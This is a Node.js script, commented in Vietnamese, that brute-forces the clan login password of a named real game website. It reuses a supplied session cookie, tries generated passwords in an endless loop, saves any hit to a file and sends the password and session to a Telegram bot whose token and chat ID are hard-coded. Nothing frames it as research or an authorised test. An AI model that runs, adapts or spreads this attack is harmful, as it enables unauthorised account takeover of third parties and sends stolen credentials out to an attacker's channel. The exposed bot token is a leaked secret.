// main.js
const axios = require("axios");
const cheerio = require("cheerio");
const fs = require("fs");
const minimist = require("minimist");
const { nextUnique, saveBitmap, getUsedCount } = require("./unique7_bitmap");

const args = minimist(process.argv.slice(2));
const SESSION_ID = args.session;

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = "6360441262:AAFfPNBTskWNwjZSjAkuptnCezHCtMCXEUM";
const TELEGRAM_CHAT_ID = "6153638404";

if (!SESSION_ID) {
  console.error("❌ Vui lòng cung cấp session ID:");
  console.error("   Ví dụ: node main.js --session=pahduuacee2jq0cnneun6fvkq3");
  process.exit(1);
}

const LOGIN_URL = "http://av1.teamobi.com/clan/?act=login";

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// Function gửi thông báo đến Telegram
async function sendTelegramMessage(message) {
  try {
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const response = await axios.post(telegramUrl, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML",
    });

    if (response.data.ok) {
      console.log("📱 Đã gửi thông báo Telegram thành công!");
    } else {
      console.error("❌ Lỗi gửi Telegram:", response.data.description);
    }
  } catch (error) {
    console.error("❌ Lỗi kết nối Telegram:", error.message);
  }
}

async function tryPassword(pass) {
  try {
    const headers = {
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "Accept-Encoding": "gzip, deflate",
      "Accept-Language": "en-US,en;q=0.9,vi;q=0.8",
      "Cache-Control": "max-age=0",
      Connection: "keep-alive",
      "Content-Type": "application/x-www-form-urlencoded",
      Cookie: `PHPSESSID=${SESSION_ID}`,
      Host: "av1.teamobi.com",
      Origin: "http://av1.teamobi.com",
      Referer: "http://av1.teamobi.com/clan/?act=login",
      "Upgrade-Insecure-Requests": "1",
      "User-Agent":
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    };

    const body = new URLSearchParams({
      pw2: pass,
      submit: "Đăng nhập",
    });

    const response = await axios.post(LOGIN_URL, body, {
      headers,
      maxRedirects: 0,
      validateStatus: (status) => status < 400,
    });

    const $ = cheerio.load(response.data);
    const err = $("p.err").text().trim();

    const formFound = $("form").filter((i, el) =>
      $(el).text().includes("Mật khẩu hội nhóm")
    );

    if (formFound.length > 0) {
      console.log("🔎 Tìm thấy form chứa 'Mật khẩu hội nhóm'");
    } else {
      console.log("❌ Không thấy form 'Mật khẩu hội nhóm'");
    }

    if (err.includes("Đăng nhập không thành công")) {
      console.log(`❌ Sai: ${pass}`);
      return false;
    } else {
      console.log(`✅ ĐÚNG MẬT KHẨU: ${pass}`);
      fs.appendFileSync("result.txt", `Mật khẩu đúng: ${pass}\n`);

      // Gửi thông báo đến Telegram khi tìm được mật khẩu đúng
      const successMessage = `🎉 <b>TÌM ĐƯỢC MẬT KHẨU!</b>

🔑 <b>Password:</b> <code>${pass}</code>
🆔 <b>Session:</b> <code>${SESSION_ID}</code>
⏰ <b>Thời gian:</b> ${new Date().toLocaleString("vi-VN")}

✅ Brute force hoàn thành thành công!`;

      await sendTelegramMessage(successMessage);

      return true;
    }
  } catch (err) {
    console.error(`⚠️ Lỗi với ${pass}:`, err.message);
    return false;
  }
}

async function bruteForce() {
  let count = 0;
  console.log("🔁 Bắt đầu dò, đã dùng:", getUsedCount());

  // Gửi thông báo bắt đầu brute force
  const startMessage = `🚀 <b>BẮT ĐẦU BRUTE FORCE</b>

🆔 <b>Session:</b> <code>${SESSION_ID}</code>
⏰ <b>Thời gian bắt đầu:</b> ${new Date().toLocaleString("vi-VN")}
🔢 <b>Đã dùng:</b> ${getUsedCount()} passwords

🔄 Đang tiến hành dò mật khẩu...`;

  await sendTelegramMessage(startMessage);

  while (true) {
    const pass = nextUnique();
    count++;

    console.log(`⏳ Thử [${count}] → ${pass}`);
    const ok = await tryPassword(pass);
    saveBitmap();

    if (ok) {
      console.log(`🎉 Thành công sau ${count} lần thử!`);
      break;
    }

    await delay(1000); // delay 1 giây
  }
}

bruteForce();
